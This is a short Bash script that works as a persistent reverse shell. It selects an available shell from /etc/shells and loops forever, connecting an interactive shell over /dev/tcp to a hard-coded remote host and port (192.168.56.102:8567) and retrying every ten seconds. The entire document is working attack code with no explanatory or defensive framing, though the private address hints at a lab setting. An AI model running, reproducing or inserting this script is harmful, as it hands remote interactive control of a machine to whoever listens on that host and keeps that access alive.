RPORT=8567
FIFO_PATH=/tmp/aware_past
RHOST="192.168.56.102"

# Find Valid Shells
SHELL_LIST=`cat /etc/shells 2> /dev/null`
if [ `echo $SHELL_LIST | wc -l` -eq 0 ]; then
    exit 1;
elif [ `(echo $SHELL_LIST | grep bash | wc -l) 2> /dev/null` -ne 0 ]; then
    SHELL=`which bash`
elif [ `(echo $SHELL_LIST | grep tsh | wc -l) 2> /dev/null` -ne 0 ]; then
    SHELL=`which tsh`
elif [ `(echo $SHELL_LIST | grep zsh | wc -l) 2> /dev/null` -ne 0 ]; then
    SHELL=`which zsh`
elif [ `(echo $SHELL_LIST | grep csh | wc -l) 2> /dev/null` -ne 0 ]; then
    SHELL=`which csh`
elif [ `(echo $SHELL_LIST | grep sh | wc -l) 2> /dev/null` -ne 0 ]; then
    SHELL=`which sh`
else
    exit 1;
fi

# remain connection forever
while true
do
    ($SHELL -i < /dev/tcp/${RHOST}/${RPORT} 1>&0 2>&0) 2> /dev/null
    if [ $? -eq 1 ]; then
        sleep 10s
    fi
done